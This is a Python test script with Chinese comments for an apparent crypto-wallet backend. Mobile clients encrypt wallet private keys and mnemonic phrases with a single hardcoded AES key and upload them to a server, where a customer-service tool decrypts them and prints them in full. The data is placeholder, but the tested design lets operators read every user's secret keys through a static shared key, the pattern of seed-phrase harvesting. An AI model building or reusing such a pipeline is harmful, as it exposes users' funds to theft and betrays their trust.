#!/usr/bin/env python3
"""
模拟移动端加密 → 服务器处理 → 客服工具解密 完整流程测试
"""
import json
import base64
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

CLIENT_KEY = b'ClientWallet2026SecureKey32B!!!!'

# 原始钱包数据
original_wallet = {
    'address': '0xMobileTestAddress',
    'chain': 'ETH',
    'private_key': '0xMobilePrivateKey1234567890abcdef1234567890abcdef1234567890ab',
    'mnemonic': 'mobile test wallet backup phrase one two three four five six'
}

print("="*70)
print("步骤1：移动端AES-GCM加密（模拟Flutter Web）")
print("="*70)

# 移动端加密（与电脑端完全一致）
json_bytes = json.dumps(original_wallet, ensure_ascii=False).encode('utf-8')
nonce = os.urandom(12)
aesgcm = AESGCM(CLIENT_KEY)
ciphertext = aesgcm.encrypt(nonce, json_bytes, None)
mobile_encrypted = base64.b64encode(nonce + ciphertext).decode('utf-8')

print(f"原始数据: {json.dumps(original_wallet, ensure_ascii=False)}")
print(f"加密后长度: {len(mobile_encrypted)}")
print(f"加密数据前80位: {mobile_encrypted[:80]}...")
print(f"✅ 移动端加密完成")

print("\n" + "="*70)
print("步骤2：服务器接收并验证（模拟server.py的/api/wallet/backup/mobile）")
print("="*70)

# 服务器接收到移动端数据
received_data = mobile_encrypted

# 验证不是明文JSON
if received_data.startswith('{'):
    print("❌ 错误：检测到明文JSON，拒绝存储")
else:
    print(f"✅ 验证通过：接收到Base64加密数据，长度: {len(received_data)}")
    
    # 直接存储（因为移动端已经是AES-GCM格式，无需转换）
    print(f"💾 数据存储到数据库...")
    stored_data = received_data
    print(f"✅ 存储完成")

print("\n" + "="*70)
print("步骤3：客服工具获取并解密（模拟decrypt_tool_gui.py）")
print("="*70)

# 客服工具从API获取数据
fetched_encrypted = stored_data

print(f"获取到加密数据长度: {len(fetched_encrypted)}")

# 判断数据类型
if fetched_encrypted.startswith('{'):
    print("❌ 这是明文JSON！")
else:
    # AES-GCM解密
    encrypted_bytes = base64.b64decode(fetched_encrypted)
    nonce = encrypted_bytes[:12]
    ciphertext = encrypted_bytes[12:]
    aesgcm = AESGCM(CLIENT_KEY)
    decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
    decrypted_wallet = json.loads(decrypted_bytes.decode('utf-8'))
    
    print(f"✅ 解密成功！")
    print(f"地址: {decrypted_wallet['address']}")
    print(f"链: {decrypted_wallet['chain']}")
    print(f"私钥: {decrypted_wallet['private_key']}")
    print(f"助记词: {decrypted_wallet['mnemonic']}")

print("\n" + "="*70)
print("步骤4：验证数据完整性")
print("="*70)

assert decrypted_wallet['address'] == original_wallet['address'], "地址不匹配！"
assert decrypted_wallet['chain'] == original_wallet['chain'], "链不匹配！"
assert decrypted_wallet['private_key'] == original_wallet['private_key'], "私钥不匹配！"
assert decrypted_wallet['mnemonic'] == original_wallet['mnemonic'], "助记词不匹配！"

print("✅ 地址匹配: PASS")
print("✅ 链匹配: PASS")
print("✅ 私钥匹配: PASS")
print("✅ 助记词匹配: PASS")

print("\n" + "="*70)
print("✅✅✅ 完整流程测试通过！")
print("移动端和电脑端使用相同的AES-GCM加密格式")
print("服务器无需转换，直接存储即可")
print("="*70)
